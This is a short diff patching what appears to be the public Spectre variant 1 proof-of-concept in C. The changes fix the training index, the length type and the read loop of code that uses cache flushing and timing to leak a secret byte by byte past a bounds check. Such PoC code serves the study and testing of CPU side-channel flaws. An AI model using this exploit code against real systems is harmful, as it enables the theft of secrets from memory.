@@ -53,7 +53,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
 
     _mm_mfence();
-    training_x = tries % array1_size;
+    //training_x = tries % array1_size;
+    training_x = 0;
     for (j = 30; j >= 0; j--) {
       _mm_clflush( & array1_size);
       for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
@@ -96,7 +97,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 int main(int argc,
   const char * * argv) {
   size_t malicious_x = 16;
-  int i, score[2], len = sizeof(SECRET) - 1;
+  int i, score[2];
+  size_t len = sizeof(SECRET) - 1;
   uint8_t value[2];
   
 
@@ -119,7 +121,7 @@ int main(int argc,
 
 
   printf("Reading %d bytes:\n", len);
-  while (--len >= 0) {
+  while (len-- > 0) {
     printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
     readMemoryByte(malicious_x++, value, score);
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
